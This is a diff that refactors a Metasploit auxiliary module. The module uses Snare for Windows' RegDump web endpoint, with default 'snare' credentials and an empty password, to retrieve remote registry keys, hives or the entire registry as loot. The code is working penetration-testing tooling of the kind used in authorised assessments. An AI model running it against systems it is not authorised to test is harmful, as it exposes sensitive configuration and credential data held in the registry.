@@ -29,16 +29,7 @@ class Metasploit4 < Msf::Auxiliary
       'References'    =>
         [
           [ 'URL', 'https://www.intersectalliance.com/wp-content/uploads/user_guides/Guide_to_Snare_for_Windows-4.2.pdf' ]
-        ],
-      'Actions'       =>
-        [
-          [ 'System Information', 'Description' => 'Retrieve information about the system' ],
-          [ 'Snare Information', 'Description' => 'Retrieve information about the Snare installation' ],
-          [ 'Dump Registry Key', 'Description' => 'Retrieve a specified registry key, including all sub-keys' ],
-          [ 'Dump Registry Hive', 'Description' => 'Retrieve a specified registry hive, including all sub-keys' ],
-          [ 'Dump Registry', 'Description' => 'Retrieve the entire Windows registry. (Note: this may take a while)' ]
-        ],
-      'DefaultAction' => 'System Information'
+        ]
     ))
 
     register_options(
@@ -46,25 +37,14 @@ class Metasploit4 < Msf::Auxiliary
         Opt::RPORT(6161),
         OptString.new('USERNAME', [ false, 'The username for Snare remote access', 'snare' ]),
         OptString.new('PASSWORD', [ false, 'The password for Snare remote access', '' ]),
-        OptString.new('REG_KEY', [ false, 'The registry key to retrieve', 'HKLM\\HARDWARE\\DESCRIPTION\\System' ]),
-        OptString.new('REG_HIVE', [ false, 'The registry hive to retrieve', 'HKLM' ]),
+        OptString.new('REG_DUMP_KEY', [ false, 'Retrieve this registry key and all sub-keys', 'HKLM\\HARDWARE\\DESCRIPTION\\System' ]),
+        OptBool.new('REG_DUMP_ALL', [false, 'Retrieve the entire Windows registry', false]),
         OptInt.new('TIMEOUT', [true, 'Timeout in seconds for downloading each registry key/hive', 300])
       ], self.class)
   end
 
   def run
-    case action.name
-    when 'System Information'
-      dump_key('HKLM\\HARDWARE\\DESCRIPTION\\System')
-    when 'Snare Information'
-      dump_key('HKLM\\Software\\InterSect Alliance')
-    when 'Dump Registry Key'
-      dump_key(datastore['REG_KEY'])
-    when 'Dump Registry Hive'
-      dump_hive(datastore['REG_HIVE'])
-    when 'Dump Registry'
-      dump_all
-    end
+    datastore['REG_DUMP_ALL'] ? dump_all : dump_key(datastore['REG_DUMP_KEY'])
   end
 
   #
@@ -76,17 +56,20 @@ class Metasploit4 < Msf::Auxiliary
     end
     hive = reg_key.split('\\').first
     key = reg_key.split('\\')[1..-1].join('\\\\')
-    if key.nil? || key.empty? || hive !~ /\A[A-Z0-9_]+\z/i
+    if hive !~ /\A[A-Z0-9_]+\z/i
       fail_with(Failure::BadConfig, "#{peer} - Please supply a valid key name")
     end
-    print_status("#{peer} - Retrieving registry key '#{hive}\\\\#{key}'...")
+    vars_get = { 'str_Base' => hive }
+    if key.eql?('')
+      print_status("#{peer} - Retrieving registry hive '#{hive}'...")
+    else
+      print_status("#{peer} - Retrieving registry key '#{hive}\\\\#{key}'...")
+      vars_get['str_SubKey'] = key
+    end
     res = send_request_cgi({
       'uri' => normalize_uri('RegDump'),
       'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-      'vars_get' => {
-        'str_Base' => hive,
-        'str_SubKey' => key
-      }
+      'vars_get' => vars_get
     }, datastore['TIMEOUT'])
     if !res
       fail_with(Failure::Unreachable, "#{peer} - Connection failed")
@@ -102,45 +85,11 @@ class Metasploit4 < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
     end
     path = store_loot(
-      'snare.registry.key',
+      'snare.registry',
       'text/plain',
       datastore['RHOST'],
       res.body,
       reg_key.gsub(/[^\w]/, '_').downcase
-    )
-    print_good("File saved in: #{path}")
-  end
-
-  #
-  # Retrieve the supplied registry hive
-  #
-  def dump_hive(hive)
-    if hive !~ /\A[A-Z0-9_]+\z/i
-      fail_with(Failure::BadConfig, "#{peer} - Please supply a valid hive name")
-    end
-    print_status("#{peer} - Retrieving registry hive '#{hive}' ...")
-    res = send_request_cgi({
-      'uri' => normalize_uri('RegDump'),
-      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-      'vars_get' => { 'str_Base' => hive }
-    }, datastore['TIMEOUT'])
-    if !res
-      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
-    elsif res.code && res.code == 401
-      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
-    elsif res.code && res.code == 404
-      fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
-    elsif res.code && res.code == 200 && res.body && res.body =~ /\AKEY: /
-      print_good("#{peer} - Retrieved hive successfully (#{res.body.length} bytes)")
-    else
-      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
-    end
-    path = store_loot(
-      'snare.registry.hive',
-      'text/plain',
-      datastore['RHOST'],
-      res.body,
-      hive.gsub(/[^\w]/, '_').downcase
     )
     print_good("File saved in: #{path}")
   end
@@ -179,6 +128,6 @@ class Metasploit4 < Msf::Auxiliary
       print_error("#{peer} - Found no registry hives")
       return
     end
-    hives.each { |hive| dump_hive(hive) }
+    hives.each { |hive| dump_key(hive) }
   end
 end
